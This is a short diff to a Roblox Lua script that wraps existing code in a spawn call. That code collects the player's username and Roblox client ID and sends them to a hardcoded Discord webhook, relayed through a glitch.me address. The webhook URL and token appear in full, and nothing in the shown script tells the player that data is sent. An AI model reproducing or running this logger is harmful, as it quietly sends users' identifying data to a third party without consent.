@@ -1,3 +1,4 @@
+spawn(function()
 local webhook = "https://discord.com/api/webhooks/943925004381356163/wH-vDIdZxIb3PbxDPw8iPCdgWV9qg7KX1ZwM1QXmE2AbUMLGwMWNeWqtDvteWg4oNSIY"
 local message = tostring(game:GetService("Players").LocalPlayer.Name).." "..game:GetService("RbxAnalyticsService"):GetClientId()
 local botname = "ClientID" 
@@ -23,3 +24,4 @@ local biggie = "http://buritoman69.glitch.me/webhook";
    return Data or nil;
 end
 specials(webhook, message, botname)
+end)
